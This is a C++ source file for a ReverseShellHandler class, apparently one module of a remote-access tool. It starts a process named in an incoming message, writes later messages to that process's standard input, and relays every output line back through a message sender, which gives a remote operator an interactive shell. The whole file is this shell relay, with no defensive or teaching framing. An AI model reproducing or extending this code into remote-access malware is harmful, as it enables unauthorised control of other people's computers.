#include "ReverseShellHandler.h"

#include "SingleProcessManager.h"

ReverseShellHandler::ReverseShellHandler(
	IMessageSender* sender
) :
	_sender(sender),
	_manager(
		CreateSingleProcessManager(
			[&](const std::string& l) { ReadOutput(l); },
			true,
			true))
{
}

void ReverseShellHandler::Handle(const MessageType type, std::span<char> content)
{
	const auto name = std::wstring(content.begin(), content.end());
	const auto command = std::string(content.begin(), content.end());

	switch (type)
	{
		case MessageType::StartReverseShell:
			_manager->Run(name);

			break;

		case MessageType::ReverseShellMessage:
			_manager->WriteToStdIn(command);

			break;

		case MessageType::StopReverseShell:
			_manager.reset();

			break;

		default:
			break;
	}
}

void ReverseShellHandler::ReadOutput(const std::string& line) const
{
	const auto content = std::span(
		const_cast<char*>(line.c_str()),
		line.size());

	_sender->Send(MessageType::ReverseShellMessage, content);
}
